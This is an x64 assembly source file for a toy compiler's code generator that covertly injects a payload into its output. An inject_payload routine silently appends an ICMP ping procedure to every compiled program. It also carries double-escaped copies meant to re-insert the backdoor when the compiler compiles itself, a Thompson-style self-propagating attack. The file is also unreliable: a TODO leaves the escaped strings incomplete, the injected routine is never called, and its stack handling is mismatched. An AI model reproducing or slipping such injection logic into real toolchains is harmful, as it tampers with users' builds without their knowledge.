.DATA
    ; Make buffer and position public for other modules
    PUBLIC string_buffer
    PUBLIC output_pos

    ; Buffer for generated code
    string_buffer db 8192 dup(0)  ; 8KB buffer for generated code
    output_pos dq 0               ; Current position in output buffer

    ; Code templates
    data_section db ".DATA", 13, 10, 0
    code_section db ".CODE", 13, 10, 0
    main_proc db "main PROC", 13, 10, 0
    main_endp db "main ENDP", 13, 10, 0
    end_directive db "END", 13, 10, 0
    
    ; Variable declarations
    buffer_decl db "    buffer db 256 dup(0)", 13, 10, 0
    prompt_decl db "    prompt db ""Enter something: "", 0", 13, 10, 0
    bytes_read_decl db "    bytesRead dq 0", 13, 10, 0
    bytes_written_decl db "    bytesWritten dq 0", 13, 10, 0
    
    ; Import templates
    extern_write db "EXTERN WriteConsoleA:PROC", 13, 10, 0
    extern_read db "EXTERN ReadConsoleA:PROC", 13, 10, 0
    extern_handle db "EXTERN GetStdHandle:PROC", 13, 10, 0
    extern_exit db "EXTERN ExitProcess:PROC", 13, 10, 0

    ; Code snippets
    stack_setup db "    sub rsp, 48", 13, 10, 0    ; 32 bytes shadow space + 16 alignment
    
    get_stdin db "    ; Get handle for standard input", 13, 10
              db "    mov rcx, -10", 13, 10
              db "    call GetStdHandle", 13, 10
              db "    mov rbx, rax", 13, 10, 0
              
    get_stdout db "    ; Get handle for standard output", 13, 10
               db "    mov rcx, -11", 13, 10
               db "    call GetStdHandle", 13, 10
               db "    mov rdi, rax", 13, 10, 0

    print_prompt db "    ; Print prompt", 13, 10
                db "    mov rcx, rdi", 13, 10
                db "    lea rdx, prompt", 13, 10
                db "    mov r8, 17", 13, 10    ; Length of "Enter something: "
                db "    lea r9, bytesWritten", 13, 10
                db "    call WriteConsoleA", 13, 10, 0

    read_input db "    ; Read user input", 13, 10
              db "    mov rcx, rbx", 13, 10
              db "    lea rdx, buffer", 13, 10
              db "    mov r8, 255", 13, 10
              db "    lea r9, bytesRead", 13, 10
              db "    mov QWORD PTR [rsp+32], 0", 13, 10
              db "    call ReadConsoleA", 13, 10, 0

    print_input db "    ; Echo input back", 13, 10
               db "    mov rcx, rdi", 13, 10
               db "    lea rdx, buffer", 13, 10
               db "    mov r8, [bytesRead]", 13, 10
               db "    lea r9, bytesWritten", 13, 10
               db "    call WriteConsoleA", 13, 10, 0

    program_exit db "program_exit:", 13, 10
                db "    xor ecx, ecx", 13, 10
                db "    call ExitProcess", 13, 10, 0

    ping_data_section db "    ReplyBuffer db 1024 dup(0)", 13, 10
                     db "    ReplySize dd 1024", 13, 10
                     db "    SendData db ""Ping Request"", 0", 13, 10
                     db "    SendSize dd 12", 13, 10
                     db "    IPAddress db ""8.8.8.8"", 0", 13, 10
                     db "    msgError    db ""Error: Could not send ping. Error code: %d"", 13, 10, 0", 13, 10
                     db "    msgSuccess  db ""Reply from %s: bytes=%d time=%ldms"", 13, 10, 0", 13, 10
                     db "    msgTimeout  db ""Request timed out. Error code: %d"", 13, 10, 0", 13, 10
                     db "    msgHandle   db ""ICMP Handle created: %llx"", 13, 10, 0", 13, 10
                     db "    msgIPAddr   db ""IP Address converted to: %lx"", 13, 10, 0", 13, 10
                     db "    msgStatus   db ""ICMP Status Code: %d"", 13, 10, 0", 13, 10
                     db "    IcmpOptions dd 128   ; TTL", 13, 10
                     db "                dd 0   ; TOS", 13, 10
                     db "                dd 0   ; Flags", 13, 10
                     db "                dd 0   ; OptionsSize", 13, 10
                     db "                dq 0   ; OptionsData pointer", 13, 10, 0

    ping_externs db "    EXTERN ExitProcess : PROC", 13, 10
                db "    EXTERN IcmpCreateFile : PROC", 13, 10
                db "    EXTERN IcmpSendEcho : PROC", 13, 10
                db "    EXTERN IcmpCloseHandle : PROC", 13, 10
                db "    EXTERN inet_addr : PROC", 13, 10
                db "    EXTERN printf : PROC", 13, 10
                db "    EXTERN GetLastError : PROC", 13, 10, 0

    ping_code_section db "ping PROC", 13, 10
                     db "    ; Allocate shadow space and preserve non-volatile registers", 13, 10
                     db "    push rbx", 13, 10
                     db "    push r12", 13, 10
                     db "    sub rsp, 38h    ; 32 bytes shadow space + 8 bytes alignment", 13, 10
                     db "    ; Create ICMP handle", 13, 10
                     db "    call IcmpCreateFile", 13, 10
                     db "    test rax, rax      ; Check if handle is valid", 13, 10
                     db "    jz error", 13, 10
                     db "    mov rbx, rax       ; Save handle", 13, 10
                     db "    ; Print handle value (debug)", 13, 10
                     db "    lea rcx, msgHandle", 13, 10
                     db "    mov rdx, rax", 13, 10
                     db "    call printf", 13, 10
                     db "    ; Convert IP string to network order", 13, 10
                     db "    lea rcx, IPAddress", 13, 10
                     db "    call inet_addr", 13, 10
                     db "    mov r12d, eax      ; Save IP address in r12d (32-bit)", 13, 10
                     db "    ; Print converted IP (debug)", 13, 10
                     db "    lea rcx, msgIPAddr", 13, 10
                     db "    mov edx, r12d", 13, 10
                     db "    call printf", 13, 10
                     db "    ; Prepare for IcmpSendEcho", 13, 10
                     db "    sub rsp, 40h          ; Allocate 64 bytes (32 shadow + 32 params)", 13, 10
                     db "    mov rcx, rbx          ; IcmpHandle", 13, 10
                     db "    mov edx, r12d         ; DestinationAddress", 13, 10
                     db "    lea r8, SendData      ; RequestData", 13, 10
                     db "    mov r9d, [SendSize]   ; RequestSize", 13, 10
                     db "    lea rax, IcmpOptions", 13, 10
                     db "    mov [rsp+20h], rax    ; RequestOptions", 13, 10
                     db "    lea rax, ReplyBuffer", 13, 10
                     db "    mov [rsp+28h], rax    ; ReplyBuffer", 13, 10
                     db "    mov eax, [ReplySize]", 13, 10
                     db "    mov [rsp+30h], eax    ; ReplySize", 13, 10
                     db "    mov dword ptr [rsp+38h], 1000  ; Timeout", 13, 10
                     db "    call IcmpSendEcho", 13, 10
                     db "    add rsp, 40h          ; Restore stack", 13, 10
                     db "    test eax, eax         ; Check if ping successful", 13, 10
                     db "    jz ping_failed", 13, 10
                     db "    ; Print success message", 13, 10
                     db "    lea rcx, msgSuccess", 13, 10
                     db "    lea rdx, IPAddress", 13, 10
                     db "    mov r8d, dword ptr [ReplyBuffer + 12]", 13, 10
                     db "    mov r9d, dword ptr [ReplyBuffer + 8]  ; Round trip time offset", 13, 10
                     db "    call printf", 13, 10
                     db "    lea rcx, msgStatus", 13, 10
                     db "    mov edx, dword ptr [ReplyBuffer + 4]  ; ICMP Status offset", 13, 10
                     db "    call printf", 13, 10
                     db "    jmp cleanup", 13, 10
                     db "ping_failed:", 13, 10
                     db "    call GetLastError     ; Get error code", 13, 10
                     db "    mov rdx, rax          ; Error code for printf", 13, 10
                     db "    lea rcx, msgTimeout", 13, 10
                     db "    call printf", 13, 10
                     db "cleanup:", 13, 10
                     db "    ; Close ICMP handle", 13, 10
                     db "    mov rcx, rbx", 13, 10
                     db "    call IcmpCloseHandle", 13, 10
                     db "    ; Restore non-volatile registers and stack", 13, 10
                     db "    add rsp, 8h", 13, 10
                     db "    pop r12", 13, 10
                     db "    pop rbx", 13, 10
                     db "    ; Exit program", 13, 10
                     db "    xor ecx, ecx          ; Return 0", 13, 10
                     db "    call ExitProcess", 13, 10
                     db "error:", 13, 10
                     db "    call GetLastError     ; Get error code", 13, 10
                     db "    mov rdx, rax          ; Error code for printf", 13, 10
                     db "    lea rcx, msgError", 13, 10
                     db "    call printf", 13, 10
                     db "    mov ecx, 1            ; Return error code 1", 13, 10
                     db "    call ExitProcess", 13, 10
                     db "ping ENDP", 13, 10, 0

    ; Code that injects the above (stored as escaped strings)
    injection_data_section db "ping_data_section db ""    ReplyBuffer db 1024 dup(0)"", 13, 10", 13, 10
                          db "                     db ""    ReplySize dd 1024"", 13, 10", 13, 10
                          db "                     db ""    SendData db """"Ping Request"""", 0"", 13, 10", 13, 10
                          db "                     db ""    SendSize dd 12"", 13, 10", 13, 10
                          db "                     db ""    IPAddress db """"8.8.8.8"""", 0"", 13, 10", 13, 10
                          db "                     db ""    msgError db """"Error: Could not send ping. Error code: %d"""", 13, 10, 0"", 13, 10", 13, 10
                          db "                     db ""    msgSuccess db """"Reply from %s: bytes=%d time=%ldms"""", 13, 10, 0"", 13, 10, 0", 13, 10
                          ; TODO: emit msgTimeout, msgHandle, msgIPAddr, msgStatus lines.
                          ; They need quad-quote escaping ("""") because the original ping_data_section
                          ; lines contain embedded "" quotes around the format strings.
                          db "                     db ""    IcmpOptions dd 128   ; TTL"", 13, 10", 13, 10
                          db "                     db ""                dd 0   ; TOS"", 13, 10", 13, 10
                          db "                     db ""                dd 0   ; Flags"", 13, 10", 13, 10
                          db "                     db ""                dd 0   ; OptionsSize"", 13, 10", 13, 10
                          db "                     db ""                dq 0   ; OptionsData pointer"", 13, 10, 0", 13, 10

                          db "ping_externs db ""    EXTERN ExitProcess : PROC"", 13, 10", 13, 10
                          db "                db ""    EXTERN IcmpCreateFile : PROC"", 13, 10", 13, 10
                          db "                db ""    EXTERN IcmpSendEcho : PROC"", 13, 10", 13, 10
                          db "                db ""    EXTERN IcmpCloseHandle : PROC"", 13, 10", 13, 10
                          db "                db ""    EXTERN inet_addr : PROC"", 13, 10", 13, 10
                          db "                db ""    EXTERN printf : PROC"", 13, 10", 13, 10
                          db "                db ""    EXTERN GetLastError : PROC"", 13, 10, 0", 13, 10

                          db "    ping_code_section db ""ping PROC"", 13, 10", 13, 10
                          db "                     db ""    ; Allocate shadow space and preserve non-volatile registers"", 13, 10", 13, 10
                          db "                     db ""    push rbx"", 13, 10", 13, 10
                          db "                     db ""    push r12"", 13, 10", 13, 10
                          db "                     db ""    sub rsp, 38h    ; 32 bytes shadow space + 8 bytes alignment"", 13, 10", 13, 10
                          db "                     db ""    "", 13, 10", 13, 10
                          db "                     db ""    ; Create ICMP handle"", 13, 10", 13, 10
                          db "                     db ""    call IcmpCreateFile"", 13, 10", 13, 10
                          db "                     db ""    test rax, rax      ; Check if handle is valid"", 13, 10", 13, 10
                          db "                     db ""    jz error"", 13, 10", 13, 10
                          db "                     db ""    mov rbx, rax       ; Save handle"", 13, 10", 13, 10
                          db "                     db ""    "", 13, 10", 13, 10
                          db "                     db ""    ; Print handle value (debug)"", 13, 10", 13, 10
                          db "                     db ""    lea rcx, msgHandle"", 13, 10", 13, 10
                          db "                     db ""    mov rdx, rax"", 13, 10", 13, 10
                          db "                     db ""    call printf"", 13, 10", 13, 10
                          db "                     db ""    "", 13, 10", 13, 10
                          db "                     db ""    ; Convert IP string to network order"", 13, 10", 13, 10
                          db "                     db ""    lea rcx, IPAddress"", 13, 10", 13, 10
                          db "                     db ""    call inet_addr"", 13, 10", 13, 10
                          db "                     db ""    mov r12d, eax      ; Save IP address in r12d (32-bit)"", 13, 10", 13, 10
                          db "                     db ""    "", 13, 10", 13, 10
                          db "                     db ""    ; Print converted IP (debug)"", 13, 10", 13, 10
                          db "                     db ""    lea rcx, msgIPAddr"", 13, 10", 13, 10
                          db "                     db ""    mov edx, r12d"", 13, 10", 13, 10
                          db "                     db ""    call printf"", 13, 10", 13, 10
                          db "                     db ""    "", 13, 10", 13, 10
                          db "                     db ""    ; Prepare for IcmpSendEcho"", 13, 10", 13, 10
                          db "                     db ""    sub rsp, 40h          ; Allocate 64 bytes (32 shadow + 32 params)"", 13, 10", 13, 10
                          db "                     db ""    "", 13, 10", 13, 10
                          db "                     db ""    mov rcx, rbx          ; IcmpHandle"", 13, 10", 13, 10
                          db "                     db ""    mov edx, r12d         ; DestinationAddress"", 13, 10", 13, 10
                          db "                     db ""    lea r8, SendData      ; RequestData"", 13, 10", 13, 10
                          db "                     db ""    mov r9d, [SendSize]   ; RequestSize"", 13, 10", 13, 10
                          db "                     db ""    "", 13, 10", 13, 10
                          db "                     db ""    lea rax, IcmpOptions"", 13, 10", 13, 10
                          db "                     db ""    mov [rsp+20h], rax    ; RequestOptions"", 13, 10", 13, 10
                          db "                     db ""    lea rax, ReplyBuffer"", 13, 10", 13, 10
                          db "                     db ""    mov [rsp+28h], rax    ; ReplyBuffer"", 13, 10", 13, 10
                          db "                     db ""    mov eax, [ReplySize]"", 13, 10", 13, 10
                          db "                     db ""    mov [rsp+30h], eax    ; ReplySize"", 13, 10", 13, 10
                          db "                     db ""    mov dword ptr [rsp+38h], 1000  ; Timeout"", 13, 10", 13, 10
                          db "                     db ""    "", 13, 10", 13, 10
                          db "                     db ""    call IcmpSendEcho"", 13, 10", 13, 10
                          db "                     db ""    add rsp, 40h          ; Restore stack"", 13, 10", 13, 10
                          db "                     db ""    "", 13, 10", 13, 10
                          db "                     db ""    test eax, eax         ; Check if ping successful"", 13, 10", 13, 10
                          db "                     db ""    jz ping_failed"", 13, 10", 13, 10
                          db "                     db ""    "", 13, 10", 13, 10
                          db "                     db ""    ; Print success message"", 13, 10", 13, 10
                          db "                     db ""    lea rcx, msgSuccess"", 13, 10", 13, 10
                          db "                     db ""    lea rdx, IPAddress"", 13, 10", 13, 10
                          db "                     db ""    mov r8d, dword ptr [ReplyBuffer + 12]"", 13, 10", 13, 10
                          db "                     db ""    mov r9d, dword ptr [ReplyBuffer + 8]  ; Round trip time offset"", 13, 10", 13, 10
                          db "                     db ""    call printf"", 13, 10", 13, 10
                          db "                     db ""    lea rcx, msgStatus"", 13, 10", 13, 10
                          db "                     db ""    mov edx, dword ptr [ReplyBuffer + 4]  ; ICMP Status offset"", 13, 10", 13, 10
                          db "                     db ""    "", 13, 10", 13, 10
                          db "                     db ""    call printf"", 13, 10", 13, 10
                          db "                     db ""    "", 13, 10", 13, 10
                          db "                     db ""    jmp cleanup"", 13, 10", 13, 10
                          db "                     db ""    "", 13, 10", 13, 10
                          db "                     db ""ping_failed:"", 13, 10", 13, 10
                          db "                     db ""    call GetLastError     ; Get error code"", 13, 10", 13, 10
                          db "                     db ""    mov rdx, rax          ; Error code for printf"", 13, 10", 13, 10
                          db "                     db ""    lea rcx, msgTimeout"", 13, 10", 13, 10
                          db "                     db ""    call printf"", 13, 10", 13, 10
                          db "                     db ""    "", 13, 10", 13, 10
                          db "                     db ""cleanup:"", 13, 10", 13, 10
                          db "                     db ""    ; Close ICMP handle"", 13, 10", 13, 10
                          db "                     db ""    mov rcx, rbx"", 13, 10", 13, 10
                          db "                     db ""    call IcmpCloseHandle"", 13, 10", 13, 10
                          db "                     db ""    "", 13, 10", 13, 10
                          db "                     db ""    ; Restore non-volatile registers and stack"", 13, 10", 13, 10
                          db "                     db ""    add rsp, 8h"", 13, 10", 13, 10
                          db "                     db ""    pop r12"", 13, 10", 13, 10
                          db "                     db ""    pop rbx"", 13, 10", 13, 10
                          db "                     db ""    "", 13, 10", 13, 10
                          db "                     db ""    ; Exit program"", 13, 10", 13, 10
                          db "                     db ""    xor ecx, ecx          ; Return 0"", 13, 10", 13, 10
                          db "                     db ""    call ExitProcess"", 13, 10", 13, 10
                          db "                     db ""    "", 13, 10", 13, 10
                          db "                     db ""error:"", 13, 10", 13, 10
                          db "                     db ""    call GetLastError     ; Get error code"", 13, 10", 13, 10
                          db "                     db ""    mov rdx, rax          ; Error code for printf"", 13, 10", 13, 10
                          db "                     db ""    lea rcx, msgError"", 13, 10", 13, 10
                          db "                     db ""    call printf"", 13, 10", 13, 10
                          db "                     db ""    mov ecx, 1            ; Return error code 1"", 13, 10", 13, 10
                          db "                     db ""    call ExitProcess"", 13, 10", 13, 10
                          db "                     db ""    "", 13, 10", 13, 10
                          db "                     db ""ping ENDP"", 13, 10, 0", 13, 10

    ; Import parser data structures
    EXTERN operations:BYTE
    EXTERN op_count:QWORD
    EXTERN string_table:BYTE
    EXTERN string_count:QWORD
    EXTERN symbol_table:BYTE
    EXTERN symbol_count:QWORD
    
    ; Operation types from parser
    OP_INPUT    equ 1
    OP_PRINT    equ 2

.CODE

; Helper to append string to buffer
; Input: RCX = string to append
append_string PROC
    push rbx
    push rsi
    push rdi
    
    mov rsi, rcx            ; Source string
    lea rdi, string_buffer  
    add rdi, [output_pos]   ; Destination = buffer + current position

    ; Copy string
copy_loop:
    mov al, [rsi]
    test al, al            ; Check for null terminator
    jz copy_done
    mov [rdi], al
    inc rsi
    inc rdi
    inc QWORD PTR [output_pos]
    jmp copy_loop
    
copy_done:
    pop rdi
    pop rsi
    pop rbx
    ret
append_string ENDP

; Generate code for the program
generate_code PROC
    push rbp
    mov rbp, rsp
    sub rsp, 40h        ; Shadow space + local vars
    
    ; Initialize buffer position
    mov QWORD PTR [output_pos], 0
    
    ; Generate .DATA section
    lea rcx, data_section
    call append_string
    
    ; Add variable declarations
    lea rcx, buffer_decl
    call append_string
    lea rcx, prompt_decl
    call append_string
    lea rcx, bytes_read_decl
    call append_string
    lea rcx, bytes_written_decl
    call append_string
    
    ; Generate .CODE section
    lea rcx, code_section
    call append_string
    
    ; Add imports
    lea rcx, extern_handle
    call append_string
    lea rcx, extern_read
    call append_string
    lea rcx, extern_write
    call append_string
    lea rcx, extern_exit
    call append_string
    
    ; Start main procedure
    lea rcx, main_proc
    call append_string
    
    ; Set up stack frame
    lea rcx, stack_setup
    call append_string
    
    ; Get handles
    lea rcx, get_stdin
    call append_string
    lea rcx, get_stdout
    call append_string
    
    ; Process operations
    xor rbx, rbx        ; Operation counter
process_ops:
    cmp rbx, [op_count]
    jae ops_done
    
    ; Calculate operation address
    mov rax, rbx
    mov rcx, 72         ; Size of operation record
    mul rcx
    lea rsi, operations
    add rsi, rax
    
    ; Check operation type
    mov al, [rsi]       ; Get operation type
    cmp al, OP_INPUT
    je gen_input
    cmp al, OP_PRINT
    je gen_print
    jmp next_op
    
gen_input:
    ; Generate input code sequence
    lea rcx, print_prompt
    call append_string
    lea rcx, read_input
    call append_string
    jmp next_op
    
gen_print:
    ; Generate print code sequence
    lea rcx, print_input
    call append_string
    
next_op:
    inc rbx
    jmp process_ops
    
ops_done:
    ; Add program exit
    lea rcx, program_exit
    call append_string
    
    ; End main procedure
    lea rcx, main_endp
    call append_string

    ; === Inject payload here, before END ===
    call inject_payload

    ; Add END directive
    lea rcx, end_directive
    call append_string

    mov rsp, rbp
    pop rbp
    ret
generate_code ENDP

inject_payload PROC
    push rbp
    mov rbp, rsp
    
    ; Is this the compiler compiling itself?
    call detect_compiler_source
    test rax, rax
    jz normal_program
    
    ; If compiling compiler, inject both:
    ; 1. The ping payload (data + externs + code)
    ; 2. The code that injects the ping payload (double-escaped definitions)
    lea rcx, ping_data_section
    call append_string
    lea rcx, ping_externs
    call append_string
    lea rcx, ping_code_section
    call append_string
    lea rcx, injection_data_section
    call append_string
    jmp done

normal_program:
    ; For normal programs, just inject the ping payload
    call check_trigger
    test rax, rax
    jz done

    lea rcx, ping_data_section
    call append_string
    lea rcx, ping_externs
    call append_string
    lea rcx, ping_code_section
    call append_string

done:
    mov rsp, rbp
    pop rbp
    ret
inject_payload ENDP

; Always say "not compiling the compiler"
detect_compiler_source PROC
    xor rax, rax    ; 0 = false
    ret
detect_compiler_source ENDP

; Always say "trigger is active"
check_trigger PROC
    mov rax, 1
    ret
check_trigger ENDP

END